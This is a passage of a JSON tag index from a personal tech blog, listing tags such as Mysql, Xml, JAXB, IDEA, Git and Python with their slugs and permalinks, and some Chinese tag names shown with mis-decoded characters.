if.com/tags/%E6%95%99%E7%A8%8B/"},{"name":"Mysql","slug":"Mysql","permalink":"https://www.sizaif.com/tags/Mysql/"},{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/tags/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Xml","slug":"Xml","permalink":"https://www.sizaif.com/tags/Xml/"},{"name":"JAXB","slug":"JAXB","permalink":"https://www.sizaif.com/tags/JAXB/"},{"name":"IDEA","slug":"IDEA","permalink":"https://www.sizaif.com/tags/IDEA/"},{"name":"Git","slug":"Git","permalink":"https://www.sizaif.com/tags/Git/"},{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://www.sizaif.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"è„šæœ¬","slug":"è„šæœ¬","permalink":"https://www.sizaif.com/tags/%E8%84%9A%E6%9C%AC/"},{"name":"Python","slug":"Python","permalink":"https://www.sizaif.com/tags/Python/"},{"name":"githubè®¡åˆ’","slug":"githubè®¡åˆ’","permalink":"https://www.sizaif.com/tags/github%E8%AE%A1%E5%88%92/"},{"name":"ç½‘ç«™","slug":"ç½‘ç«™","permalink":"https://www.sizaif.com/tags/%E7%BD%91%E7%AB%99/"}]}